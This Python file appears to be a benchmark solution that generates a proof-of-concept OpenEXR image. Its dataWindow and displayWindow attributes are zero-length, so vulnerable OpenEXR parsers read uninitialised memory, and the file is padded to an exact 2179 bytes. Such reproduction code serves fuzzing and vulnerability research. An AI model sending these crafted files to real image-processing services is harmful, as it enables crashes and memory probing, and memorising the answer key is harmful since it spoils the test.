import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # EXR Magic: 0x76, 0x2f, 0x31, 0x01
        magic = b'\x76\x2f\x31\x01'
        # Version 2, flags 0
        version = b'\x02\x00\x00\x00'

        def pack_str(s):
            return s.encode('ascii') + b'\x00'

        def make_attr(name, type_name, data):
            # Attribute layout: name(str), type(str), size(4), data
            return pack_str(name) + pack_str(type_name) + struct.pack('<I', len(data)) + data

        attrs = []
        
        # Mandatory attributes
        # channels: "R", type 1 (HALF), sampling 1,1
        ch_data = pack_str("R") + struct.pack('<I', 1) + struct.pack('<I', 0) + b'\x00'*12 + struct.pack('<II', 1, 1) + b'\x00'
        attrs.append(make_attr("channels", "chlist", ch_data))
        
        # compression: 0 (NO_COMPRESSION)
        attrs.append(make_attr("compression", "compression", b'\x00'))
        
        # Trigger: dataWindow with size 0
        # In vulnerable versions, Box2iAttribute allocates uninitialized memory and reads 0 bytes (size=0).
        # The uninitialized members are then used in Header validation (sanityCheck), triggering MSan.
        # In fixed versions, memory is initialized or size is checked.
        attrs.append(make_attr("dataWindow", "box2i", b''))
        
        # displayWindow: also size 0
        attrs.append(make_attr("displayWindow", "box2i", b''))
        
        # lineOrder: 0 (INCREASING_Y)
        attrs.append(make_attr("lineOrder", "lineOrder", b'\x00'))
        
        # pixelAspectRatio: 1.0
        attrs.append(make_attr("pixelAspectRatio", "float", struct.pack('<f', 1.0)))
        
        # screenWindowCenter: 0.0, 0.0
        attrs.append(make_attr("screenWindowCenter", "v2f", struct.pack('<2f', 0.0, 0.0)))
        
        # screenWindowWidth: 1.0
        attrs.append(make_attr("screenWindowWidth", "float", struct.pack('<f', 1.0)))
        
        # Padding to reach exactly 2179 bytes
        # Structure: Magic(4) + Ver(4) + Header + Null(1) + Offsets(8) + Scanline(10)
        # Header includes all attributes.
        # Padding attribute overhead: "comments"(9) + "string"(7) + Size(4) = 20 bytes
        # Fixed overhead: 4 + 4 + 1 + 8 + 10 = 27 bytes
        
        current_attrs_len = sum(len(a) for a in attrs)
        total_overhead = 27 + 20
        target_len = 2179
        padding_size = target_len - (current_attrs_len + total_overhead)
        
        if padding_size < 0:
            padding_size = 0
            
        attrs.append(make_attr("comments", "string", b'A' * padding_size))
        
        # Combine attributes and add null terminator for header
        header_content = b''.join(attrs) + b'\x00'
        
        # Offset table: 1 entry (8 bytes) pointing to scanline data
        # Offset is relative to start of file.
        # Scanline starts after Magic(4) + Ver(4) + Header + OffsetTable(8)
        scanline_offset = 8 + len(header_content) + 8
        offset_table = struct.pack('<Q', scanline_offset)
        
        # Scanline data: y(4), pixel_data_size(4), data(2)
        # y=0, size=2 bytes (1 pixel HALF), data=0x0000
        scanline_data = struct.pack('<i', 0) + struct.pack('<I', 2) + b'\x00\x00'
        
        return magic + version + header_content + offset_table + scanline_data